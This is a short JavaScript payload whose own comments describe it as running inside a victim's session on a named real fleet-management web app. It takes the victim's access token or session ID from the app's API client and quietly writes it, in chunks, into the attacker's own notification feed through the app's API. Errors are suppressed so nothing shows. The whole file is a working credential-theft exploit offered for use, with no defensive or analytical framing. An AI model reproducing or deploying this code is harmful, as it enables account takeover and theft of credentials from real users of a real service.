/*
 * a.js — the payload that runs INSIDE the victim's afmfe.att.com session.
 * IN-APP version: no webhook.site, no server. It writes the victim's credential into
 * the ATTACKER's own notification feed, using the app's own API. The attacker then just
 * reads their own feed and the token is there.
 *
 * Before uploading: put YOUR recipient id in ATTACKER_RECIP
 *   (get it with:  Get{Recipient}  as your low-priv account -> the row with recipientType "LogPopup")
 */

const ATTACKER_RECIP = 'PASTE-YOUR-RECIPIENT-ID-HERE';   // e.g. "b2D"

(async () => {
  try {
    const conn = geotab.getSharedVariable('default').connection;         // the app's own API client
    const creds = await conn.getCredentials();                          // {userName, accessToken|sessionId, database}
    const data  = creds.accessToken || creds.sessionId || JSON.stringify(creds);

    const CH = 150;                                                     // chunk (field length cap is small)
    for (let i = 0; i * CH < data.length; i++) {
      const chunk = data.slice(i * CH, (i + 1) * CH);
      const d = conn.call('Add', { typeName: 'Notification', entity: {
        recipient: { id: ATTACKER_RECIP },
        dateTime:     new Date().toISOString(),
        dateTimeEnd:  '2099-12-31T23:59:59.999Z',
        notificationApplicationExceptionData: {
          source: 'zzc' + i, description: 'zzc' + i, info: chunk, machineName: 'zzcA'
        }
      }});
      try { await new Promise((res, rej) => d.beginInvoke(res, rej)); } catch (e) {}
    }
  } catch (e) { /* silent */ }
})();
